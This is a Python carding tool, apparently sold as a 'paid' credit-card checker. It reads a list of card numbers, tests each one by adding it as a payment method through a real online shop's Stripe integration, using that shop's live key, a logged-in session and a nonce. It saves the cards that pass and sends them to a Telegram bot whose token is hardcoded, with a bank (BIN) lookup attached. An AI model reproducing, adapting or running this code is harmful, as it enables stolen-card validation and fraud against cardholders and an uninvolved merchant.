import requests,time,user_agent,re,base64,random,re,base64,os,sys,json
from user_agent import *
from colorama import Fore
#---------[COLORS]--------#
Z =  '\033[91m' 
F = '\033[2;32m' 
B = '\033[2;36m'
X = '\033[1;33m' 
C = '\033[2;35m'
OKBLUE = '\033[94m'
WARNING = '\033[93m'
ENDC = '\033[0m'
BOLD = '\033[1m'
UNDERLINE = '\033[4m'
LIME = '\033[38;5;10m'
W=Fore.WHITE
L=Fore.BLUE
#-------[CLEAR]--------#
def clear():
    os.system('clear')
#----------LOGO-------------#
logo = ("""
\033[38;2;173;216;230m ########  ########     ###     ######    #######  ##    ## 
\033[38;2;255;160;122m ##     ## ##     ##   ## ##   ##    ##  ##     ## ###   ## 
\033[38;2;144;238;144m ##     ## ##     ##  ##   ##  ##        ##     ## ####  ## 
\033[38;2;255;69;0m ##     ## ########  ##     ## ##   #### ##     ## ## ## ## 𝙇
\033[38;2;30;144;255m ##     ## ##   ##   ######### ##    ##  ##     ## ##  #### 𝙊
\033[38;2;238;130;238m ##     ## ##    ##  ##     ## ##    ##  ##     ## ##   ### 𝙍
\033[38;2;255;215;0m ########  ##     ## ##     ##  ######    #######  ##    ## 𝘿\033[1;93m
\x1b[1;95m┏───────────────────────────────────────────────┓
\x1b[1;94m \x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;96m 𝘈𝘜𝘛𝘏𝘖𝘙     \x1b[1;97m: \033[38;2;72;209;204mNIGHT STALKER
\x1b[1;95m \x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;96m 𝘛𝘠𝘗𝘌       \x1b[1;97m: \033[38;2;255;69;0mPAID🔥
\x1b[1;95m \x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;96m 𝘎𝘐𝘛𝘏𝘜𝘉     \x1b[1;97m: \033[38;2;147;112;219mNIGHT-STALKER-666
\x1b[1;95m \x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;96m 𝘛𝘖𝘖𝘓       \x1b[1;97m: \033[38;2;0;206;209mB3 CC CHECKER
\x1b[1;95m \x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;96m 𝘝𝘌𝘙𝘚𝘐𝘖𝘕    \x1b[1;97m: \033[38;2;255;105;180m2.1
\x1b[1;91m \x1b[1;46m\033[1;91m ✅ NOT JUST A BRAINTREE CHECKER\033[;0m\033[1;91m\033[1;92m
\x1b[1;95m┗───────────────────────────────────────────────┛
""")
def linex():
        print("\x1b[1;94m"+"━"*40+"\x1b[0;1m")
def clear():
        os.system(f'clear')
        print(logo)
#--------[FLAGS]-----------#
def clear_terminal():
    os.system('cls' if os.name == 'nt' else 'clear')
channel_id = "-1002317552901"
country_flags = {
    "Afghanistan": "🇦🇫", "Albania": "🇦🇱", "Algeria": "🇩🇿", "Andorra": "🇦🇩", "Angola": "🇦🇴", "Antigua and Barbuda": "🇦🇬", "Argentina": "🇦🇷", "Armenia": "🇦🇲", "Australia": "🇦🇺", "Austria": "🇦🇹", "Azerbaijan": "🇦🇿",
    "Bahamas": "🇧🇸", "Bahrain": "🇧🇭", "Bangladesh": "🇧🇩", "Barbados": "🇧🇧", "Belarus": "🇧🇾", "Belgium": "🇧🇪", "Belize": "🇧🇿", "Benin": "🇧🇯", "Bhutan": "🇧🇹", "Bolivia": "🇧🇴", "Bosnia and Herzegovina": "🇧🇦", "Botswana": "🇧🇼",
    "Brazil": "🇧🇷", "Brunei": "🇧🇳", "Bulgaria": "🇧🇬", "Burkina Faso": "🇧🇫", "Burundi": "🇧🇮", "Cabo Verde": "🇨🇻", "Cambodia": "🇰🇭", "Cameroon": "🇨🇲", "Canada": "🇨🇦", "Central African Republic": "🇨🇫", "Chad": "🇹🇩",
    "Chile": "🇨🇱", "China": "🇨🇳", "Colombia": "🇨🇴", "Comoros": "🇰🇲", "Congo": "🇨🇬", "Congo (Democratic Republic)": "🇨🇩", "Costa Rica": "🇨🇷", "Croatia": "🇭🇷", "Cuba": "🇨🇺", "Cyprus": "🇨🇾", "Czech Republic": "🇨🇿",
    "Denmark": "🇩🇰", "Djibouti": "🇩🇯", "Dominica": "🇩🇲", "Dominican Republic": "🇩🇴", "Ecuador": "🇪🇨", "Egypt": "🇪🇬", "El Salvador": "🇸🇻", "Equatorial Guinea": "🇲🇱", "Eritrea": "🇪🇷", "Estonia": "🇪🇪", "Eswatini": "🇸🇿",
    "Ethiopia": "🇪🇹", "Fiji": "🇫🇯", "Finland": "🇫🇮", "France": "🇫🇷", "Gabon": "🇬🇦", "Gambia": "🇲🇲", "Georgia": "🇬🇪", "Germany": "🇩🇪", "Ghana": "🇬🇭", "Greece": "🇬🇷", "Grenada": "🇬🇩", "Guatemala": "🇵🇪",
    "Guinea": "🇬🇳", "Guinea-Bissau": "🇬🇼", "Guyana": "🇬🇾", "Haiti": "🇭🇹", "Honduras": "🇭🇳", "Hungary": "🇭🇺", "Iceland": "🇮🇸", "India": "🇮🇳", "Indonesia": "🇮🇩", "Iran": "🇮🇷", "Iraq": "🇮🇶", "Ireland": "🇮🇪",
    "Israel": "🇮🇱", "Italy": "🇮🇹", "Jamaica": "🇯🇲", "Japan": "🇯🇵", "Jordan": "🇯🇴", "Kazakhstan": "🇰🇿", "Kenya": "🇰🇪", "Kiribati": "🇰🇮", "Korea (North)": "🇰🇵", "Korea (South)": "🇰🇷", "Kuwait": "🇰🇼", "Kyrgyzstan": "🇰🇬",
    "Laos": "🇱🇦", "Latvia": "🇱🇻", "Lebanon": "🇱🇧", "Lesotho": "🇱🇸", "Liberia": "🇱🇸", "Libya": "🇱🇾", "Liechtenstein": "🇱🇮", "Lithuania": "🇱🇹", "Luxembourg": "🇱🇺", "Madagascar": "🇲🇬", "Malawi": "🇲🇼", "Malaysia": "🇲🇾",
    "Maldives": "🇲🇻", "Mali": "🇲🇱", "Malta": "🇲🇹", "Marshall Islands": "🇲🇭", "Mauritania": "🇲🇷", "Mauritius": "🇲🇺", "Mexico": "🇲🇽", "Micronesia": "🇫🇲", "Moldova": "🇲🇩", "Monaco": "🇲🇨", "Mongolia": "🇲🇳", "Montenegro": "🇲🇪",
    "Morocco": "🇲🇦", "Mozambique": "🇲🇿", "Myanmar": "🇲🇲", "Namibia": "🇳🇦", "Nauru": "🇳🇷", "Nepal": "🇳🇵", "Netherlands": "🇳🇱", "New Zealand": "🇳🇿", "Nicaragua": "🇳🇮", "Niger": "🇳🇪", "Nigeria": "🇳🇬", "North Macedonia": "🇲🇰",
    "Norway": "🇳🇴", "Oman": "🇴🇲", "Pakistan": "🇵🇰", "Palau": "🇵🇼", "Palestine": "🇵🇸", "Panama": "🇵🇦", "Papua New Guinea": "🇵🇬", "Paraguay": "🇵🇾", "Peru": "🇵🇪", "Philippines": "🇵🇭", "Poland": "🇵🇱", "Portugal": "🇵🇹",
    "Qatar": "🇶🇦", "Romania": "🇷🇴", "Russia": "🇷🇺", "Rwanda": "🇷🇼", "Saint Kitts and Nevis": "🇰🇳", "Saint Lucia": "🇱🇨", "Saint Vincent and the Grenadines": "🇻🇨", "Samoa": "🇼🇸", "San Marino": "🇸🇲", "Sao Tome and Principe": "🇸🇹",
    "Saudi Arabia": "🇸🇦", "Senegal": "🇸🇳", "Serbia": "🇷🇸", "Seychelles": "🇸🇨", "Sierra Leone": "🇸🇱", "Singapore": "🇸🇬", "Slovakia": "🇸🇰", "Slovenia": "🇸🇮", "Solomon Islands": "🇸🇧", "Somalia": "🇲🇲", "South Africa": "🇿🇦",
    "South Sudan": "🇸🇸", "Spain": "🇪🇸", "Sri Lanka": "🇱🇰", "Sudan": "🇸🇩", "Suriname": "🇸🇷", "Sweden": "🇸🇪", "Switzerland": "🇨🇭", "Syria": "🇸🇾", "Taiwan": "🇹🇼", "Tajikistan": "🇹🇯", "Tanzania": "🇹🇿", "Thailand": "🇹🇭",
    "Timor-Leste": "🇹🇱", "Togo": "🇹🇬", "Tonga": "🇹🇴", "Trinidad and Tobago": "🇹🇹", "Tunisia": "🇹🇳", "Turkey": "🇹🇷", "Turkmenistan": "🇹🇲", "Tuvalu": "🇹🇻", "Uganda": "🇺🇬", "Ukraine": "🇺🇦", "United Arab Emirates": "🇦🇪",
    "United Kingdom": "🇬🇧", "United States of America": "🇺🇸", "Uruguay": "🇺🇾", "Uzbekistan": "🇺🇿", "Vanuatu": "🇻🇺", "Vatican City": "🇻🇦", "Venezuela": "🇻🇪", "Vietnam": "🇻🇳", "Yemen": "🇾🇪", "Zambia": "🇿🇲", "Zimbabwe": "🇿🇼"
}
#--------[BIN-CHECK]-------#
def get_country_flag(country_name):
    return country_flags.get(country_name, '')

def bin_lookup(bin_code):
    url = f"https://bins.antipublic.cc/bins/{bin_code}"
    response = requests.get(url)

    if response.status_code == 200:
        data = response.json()
        
        bank_name = data.get('bank', 'N/A')
        country_name = data.get('country_name', 'N/A')
        country_flag = data.get('country_flag', '')
        scheme = data.get('brand', 'N/A')
        card_type = data.get('type', 'N/A')
        level = data.get('level', 'N/A')
        country_currencies = data.get('country_currencies', 'N/A')

        scheme = scheme if scheme else "N/A"
        card_type = card_type if card_type else "N/A"
        level = level if level else "N/A"
        bank_name = bank_name if bank_name else "N/A"
        country_name = country_name if country_name else "N/A"
        
        result = (
            f"*🔹 𝗜𝗡𝗙𝗢:* `{scheme.upper()} - {card_type.upper()} - {level.upper()}`\n"
            f"*🔹 𝗜𝗦𝗦𝗨𝗘𝗥:* _{bank_name.upper()}_\n"
            f"*🔹 𝗖𝗢𝗨𝗡𝗧𝗥𝗬:* `{country_name.upper()}` {country_flag}\n"
            f"*🔹 𝗖𝗨𝗥𝗥𝗘𝗡𝗖𝗜𝗘𝗦:* `{country_currencies}`"
        )
        return result
    else:
        return "*[✘] BIN lookup failed.*"
#-------[SAVE CARDS]----#
def save_valid_card(ccx):
    with open("valid_cards.txt", "a") as file:
        file.write(f"{ccx}\n")
#-------[USERNAME FETCH]
bot_token = "7814941492:AAFdOLY604OvdbptJBh6KFgvUkGkx-h3UHg"
def get_telegram_username(user_id, bot_token):
    try:
        url = f"https://api.telegram.org/bot{bot_token}/getChat?chat_id={user_id}"
        response = requests.get(url)
        data = response.json()
        
        if response.status_code == 200 and "result" in data:
            username = data["result"].get("username", None)
            if username:
                return f"@{username}"
            else:
                return "This user does not have a username."
        else:
            return f"Failed to fetch username. Error: {data.get('description', 'Unknown error')}"
    except Exception as e:
        return f"An error occurred: {str(e)}"
#-------[ANIMATION]-----#
def typewriter(text, speed=0.1):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(speed)
    print()
message = f"{LIME}{BOLD}GO TO {WARNING}{UNDERLINE}B3 DROPPER BOT{ENDC} {LIME}AND CLICK ON START. ELSE WAIT,{ENDC} {WARNING}{BOLD}CODE WILL REDIRECT YOU 🤝{ENDC}"

#-------[CHECKER]-------#
clear_terminal()
print(logo)
typewriter(message, speed=0.03)
time.sleep(5)
os.system(f'xdg-open https://t.me/b3ccdrop_bot')
clear_terminal()
print(logo)
user_id = input("Please enter your Telegram user ID: ")
combo=input(X+'CC FILE PATH :'+X)
y=open(f'{combo}',"+r")
start_num = 0
F = '\033[2;32m'
Z= '\033[2;31m'
for y in y:
    start_num += 1
    ccx = y.strip().split('\n')[0]
    c = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3]
    bin_code = c[:6]
    if "20" in yy:
        yy = yy.split("20")[1]
    user = user_agent.generate_user_agent()
    r = requests.session()
    headers = {
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,bn;q=0.8',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'priority': 'u=1, i',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user,
}

    data = f'type=card&billing_details[name]=+&billing_details[email]=dragontech177%40gmail.com&card[number]={c}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=04b83a55-5559-448f-8b8b-e48163f57fc62e7bb7&muid=26d24a50-8c44-4835-bebb-23a80e637e81dc92c6&sid=6b753291-cfff-40d7-8700-855213b0b80fd6e9c3&pasted_fields=number&payment_user_agent=stripe.js%2F946d9f95b9%3B+stripe-js-v3%2F946d9f95b9%3B+split-card-element&referrer=https%3A%2F%2Fwww.dalewooddesignsgb.co.uk&time_on_page=26635&key=pk_live_8AOKNZetuMq5MDbq6uKUyjDM&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiWTRSL3IwYmF4NjJ0cytkdlJEVFBKSVFyL2tvQmx6b295SGc1MHJSK3dCdGpHaW9iMXNIMVp0TldEaWhIRzUrS3VEOGFSbUc1SXVHaHhlRTBjMnZNYnpVS0w3L2JlcVJORkxodjlic1htLzhVNmJRNCtMUXVGdWFVK2Z1S24ycnQyNCt3NVNCZDRyelp1VnhvMzZuSHJUQlEvNDVyZ2I2SnN5amE2cVNXUG1NT1RNdWFPZng3U010MzVhYVhEK2xHdnFISUR1ZWozR0FGWXdvRExrVmJWU0svWjltWmpWbm5HczlBSVdSdHpBQkxyVkFoN0YzS0tUcXg0VGZvc2Y2bzdJRmZvT0NyNkg5RXQveDROdk5oeENxaFZrRmlpNXFiWkc4NGpKKzNNSTlnbEZxdUFCbnFodWh1a0RRb1h1UGlpVXJvZmo1dzdnS0hrMWhveVdCZEtuVGZJVWN3TU5sR3pzN3A0SHl4NlFYb3ErOE1Mano4aitGTEJacXF6NTZwZzkrMm1jVGhlek83MGh6NE9STmtuMzBVS09HUWtFQzJpSXVrZlRhOHJEYXZIRVBSMnJ3YWY0RkZ0Tm96WkpOVWYxK2g0WC9MVCt1V2ZTVWM2KzRzZHB1eWgxZTBZRVhhT0d1VzZWVUdvUVR1eFROTEtHZTNRSms4RmY1NTdmc1JhSXpTVTRXRUN3MkpFZHpqUXFpdG4vazdINi9hM0hVM1dLYVpwZFkySnMwYmVqK1VVS1UzcWIzTTQ0eWhjT3VNaWpsaXh5Zk8rbUpKYUhsblZQQlY4YjdMd014cWdnbFlVMW1hblhzMGJoRzRGeU13eis1MDdoNFZPd1RiR096TnhGczZmaEppZ09tZ0NqbE9ZOUxMc2ZRVnJNQlNyT2NtaktTSFA1dmE5Sm04U0JpMUV0a29hakZ2MU5VNWM5b1F1NFU4YmhTN1BEa0RNM3lJTm1EUE9abVR0U1ZOcUJGN3cxM0NXaDd0Z3p4aXdwNTdWemNVYkRFT2U2QnBMS1VPZXlxaVFSZGoyQlBsRDRoWHVwdWl0WjJ3QkhLeCtCaEhxcG84WGQwOEdmdFV3NHJjNVdlbFYxZzNuNkU3T2dYMkp5WkVqWjhKVHVXVU5oYUlLaW92bWtBR2pUY3VrdklRSnRsVW5PaTFQbVlCZGFHd3ZtZldleERUa2ZBNitudUR5OFJRV1BKNTFYY0pBak5FWVh1VVprMmg2ZGpLeWtCalVwa2VjQTB3TUVTYm05Y1htL1NnWVM5U0dOVVQzZ3hGQk81bUlIMm9IYXlITDBaMFFHd3RNalVSMWRqZFRyVzd6T2duQUFGd2lCTVpqWWR2ODZac2JVdkkzNkNlWnhuRU5zRWNrR1BpNy9uWjhiNXFTc2g4c1huSTRhRGNHdjQ5MG80dldZOWprWUo3YmYwVklRU1NRR2VNQlJOdE02VGtzMi83Z3FTODVYejBNcHFJdVAwVDhDQTVzTExyenRZZHBSdkV1MmhWVmplS3R2ZG5BNG9JYVZyVjRCdmZhUzFSSkpVUHZsYlo5M1VRRGdUMjJ3MkhackFtWllCNnBWMzhWRlMvWng3V3VEYUwyblk4aUNJQjFHWHFzbzl0aDkvSTNNSGMrSFNsdXZ6eE9yK0tmbUZxZFI0RzZQNVhtZTd1WDRhMEVQNWlCOVdQSFFnQzlNZXhGcmJCSE16Vy9UNXUyTHJvZkx5VEdIOWdKMU5uSEZ3MFkvRU1EM3piMjdUdGg0aEF0aldJSW5ZaGI5V3ZTZnJiZDdpVGhIaEMxdy8zaUZwRnM4VUlpU3Y0eFgyNnBoOWkxbmtlZVFXUWljMXJZazdaSDFPYmdoNkhaOVkrUUZFd00rTDVIU2l6czE1NytNendGdUtkZ0UrOTJUL0NaU2sxbzVKNjN3MU9laFVTYlZNVVJ6OVJhZHZTRmVrNE5TSXQ1MXM0Q2FYaUJaVkxXd1VqMnNHenY3WTR6Rm90L2p1NkVSY0RlS2V2bEdkOGFwdUt6WXhBRERsdGNCNXBOTVVpSG1OTHVpc1lUMkxGU09iY3ZXNXJvd2xjUGFaZ2JIazNsYXN5eVZ0QlRmb09ERXBmclJKZjV2K29RU1pwcFAyNTd3ZEpvOTVnQ0RZR2NUanUwdnRQTC9MaW1EUEJOcndnUDFjRlhaKzZwOUd0RkJRTHEzdlJqS2N4UnBLUHo4SHJRekRZNDJTRlNpbVg0eGpIUTQ1MEJxY083MFAzcmRFNlRvalUxQkZGUnR1Qk9NTVBaTXNiV0xjRjZsMzlENW12cGRTSUttbVNrVUEvczRGdk1rK0FzR0gvWFduS0pPaXpUYzdxQWVtcjNRVWduaXBid2NjanA4MlVwTzNJeXh0ZHBOZTRiSjdzTk0rK0tnejlManBIK3FTQ0lEbkl4b09qdnJmelRqaklIQWlOenF0SGRGSHBCbXVlVlE2VDlqMHE3djNEa0RkOXdiMFRLTTRQVm5vTE1lZEhkblg3aHZ2MSttM3ljeGh1eG9lcWQ0U1JWb2VtRlE0MzhEbisxYnJqOHJuSGFSZ3IzV2VkYnJJSmFOOVZLWXE5NGtIME5vZ0RFUFhaSEhacnZtNW8xT3lCcDVlQVcveHdCU2VJUHZZUzczMnZQM3JPSm1TS1lyZmdaeFF2T080WHg3d2w4cTJraUREY2ptVlR4cnU5MGpMaForbXBOZUt4bDkzS0VrN0VLQ25ncUEvc3RRYnNmQjVpL2FiZjVtOGVMd2EvT3F5UGZ1RThIM0Uwd21memJuTXRMc3BaVm8wd0VRTEMwd241ZlBKRDh5WmhZQTlrRUxVSENUZXJtYTExSDZWUFNaVkZYSUhmbG5MLzdzOCtkWmREOUVXUkpYb1VPQlJqWVdxeHBjMVhpSEdxdCtrWThhOTdBMzZlQWZZTXpWQTMrNU1KSTREMDVIdDIiLCJleHAiOjE3MzUyNDMxODcsInNoYXJkX2lkIjoyNTkxODkzNTksImtyIjoiM2MzZDhkZWUiLCJwZCI6MCwiY2RhdGEiOiJVSzlPVEpDT2JBL0ZIN1VlN09JN3hsRlNRblZyTVdMYlZMVUZHRk5DeUp3enE5ZGlhTUJoNHJ0ejlKdXBLZE9ZbTQ2YnNKdmdHZjB4QTJwRmowMU45SnVtU0NCbkZyR3Y3M0c5RUhBOTIzY1VhZTlyNHJuWTZiaFZBK216YitYVVV3ZDRhUm5UVXpRNmxYV0hwbTZJTjBaSURUcXNQTVE2S0N2b3E3QzRhUTVZb1MxNFp2SG5USFRXY0Y3ZjdQU1pxcDFUcmhmKzBZdG5FSENFIn0.j36F0bsDJo506fhr8Pz3bMdub-GfW7a8vzLrLqBFWKA'
    response = r.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
    id = response.json()['id']
    import requests

    cookies = {
    '_ga': 'GA1.1.1706587384.1735145820',
    '__stripe_mid': '26d24a50-8c44-4835-bebb-23a80e637e81dc92c6',
    'tk_ai': 'irMlT%2BIkt%2BohtfpMWJH9pFfr',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2024-12-26%2017%3A08%3A59%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.dalewooddesignsgb.co.uk%2Fmy-account%2Flost-password%2F%3Fshow-reset-form%3Dtrue%26action%3Dnewaccount%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add': 'fd%3D2024-12-26%2017%3A08%3A59%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.dalewooddesignsgb.co.uk%2Fmy-account%2Flost-password%2F%3Fshow-reset-form%3Dtrue%26action%3Dnewaccount%7C%7C%7Crf%3D%28none%29',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'tk_or': '%22%22',
    'tk_r3d': '%22%22',
    'tk_lr': '%22%22',
    'wordpress_logged_in_a4cb4cdb8c949ef92a22e0de393c242e': 'dragontech177%7C1735405895%7CdTl9vDlotONLWXH2zeD5L0CF8kJISpQoZzV16ZMz5Fk%7C6ece606cbfed5985249939382b74008a1376605a4c91167820e70f32d77873ba',
    'woocommerce_items_in_cart': '1',
    'woocommerce_cart_hash': 'dc0ccaaf23a308b9a4223c559b7df877',
    'wp_woocommerce_session_a4cb4cdb8c949ef92a22e0de393c242e': '112%7C%7C1735405898%7C%7C1735402298%7C%7C251801b935ef48b919d3027845bfe038',
    '_ga_NVPRDJWH8N': 'GS1.1.1735233054.2.1.1735233098.0.0.0',
    'sbjs_udata': 'vst%3D2%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Safari%2F537.36',
    'sbjs_session': 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.dalewooddesignsgb.co.uk%2Fmy-account%2Fadd-payment-method%2F',
    'tk_qs': '',
    '_ga_HVCBCS8F7X': 'GS1.1.1735243050.5.0.1735243050.60.0.0',
    '__stripe_sid': '6b753291-cfff-40d7-8700-855213b0b80fd6e9c3',
}

    headers = {
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9,bn;q=0.8',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://www.dalewooddesignsgb.co.uk',
    'priority': 'u=1, i',
    'referer': 'https://www.dalewooddesignsgb.co.uk/my-account/add-payment-method/',
    'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': user,
    'x-requested-with': 'XMLHttpRequest',
}

    params = {
    'wc-ajax': 'wc_stripe_create_setup_intent',
}

    data = {
    'stripe_source_id': id,
    'nonce': '614f724d0d',
}

    response = r.post('https://www.dalewooddesignsgb.co.uk/', params=params, cookies=cookies, headers=headers, data=data)
    text = response.text
    pattern = r'"status":\s*"(.*?)"'
    match = re.search(pattern, text)
    if match:
        status = match.group(1)
    if status == "error":
        print(f"\033[1;31m[\033[1;33m{start_num}\033[1;31m] \033[1;37m{ccx} \033[0;31m>> \033[1;31mDecline ❌\033[0m")
    elif status == "success":
        print(f"\033[1;32m[\033[1;33m{start_num}\033[1;32m] \033[1;37m{ccx} \033[0;32m>> \033[1;32mSuccess ✅\033[0m")
        save_valid_card(ccx)
        username = get_telegram_username(user_id, bot_token)
        bin_result = bin_lookup(bin_code)
        message = f"""
✥ 𝐃𝐑𝐀𝐆𝐎𝐍 𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 𝐕𝟏.𝟎 ✥
★━━━━━━✧★✰★✧━━━━━━★
🔹 𝗖𝗮𝗿𝗱- {ccx}
🔹 𝗚𝗮𝘁𝗲𝘄𝗮𝘆- Stripe Auth
🔹 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲- ⤿ success ⤾
★━━━━━━[𝐁𝐈𝐍 𝐈𝐍𝐅𝐎]━━━━━━★
{bin_result}
★━━━━━━✧★✰★✧━━━━━━★
✨ 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐝 𝐁𝐲- [★ Night Stalker 🐾🐐](tg://user?id=1344144034)
✨ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲- {username}
"""
        requests.post(f"https://api.telegram.org/bot7814941492:AAFdOLY604OvdbptJBh6KFgvUkGkx-h3UHg/sendMessage", data={'chat_id': user_id, 'text': message, 'parse_mode': 'Markdown'})
else:
    print(f'[{start_num}] {ccx} >> {status}❌')
    time.sleep(100)
